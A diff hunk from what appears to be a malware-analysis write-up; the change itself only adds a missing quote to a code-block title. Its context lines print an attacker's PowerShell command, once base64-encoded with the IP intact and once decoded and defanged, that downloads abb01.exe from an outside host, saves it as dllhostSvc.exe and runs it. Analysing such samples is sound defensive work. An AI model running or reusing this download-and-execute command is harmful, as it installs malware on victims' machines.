@@ -332,7 +332,7 @@ This is the same IP address we have observed across all Testing and Production p
 $ echo "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADQANAAuADcAOAAuADEANwA3AC8AYQBiAGIAMAAxAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIAKQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIA" | base64 -D
 ```
 
-```powershell title="Resulting powershell output (defanged)
+```powershell title="Resulting powershell output (defanged)"
 iex ((new-object system.net.webclient).downloadfile("http://104[.]244[.]78[.]177/abb01.exe","$env:LOCALAPPDATA\dllhostSvc.exe"));Start-Process "$env:LOCALAPPDATA\dllhostSvc.exe"
 ```
 
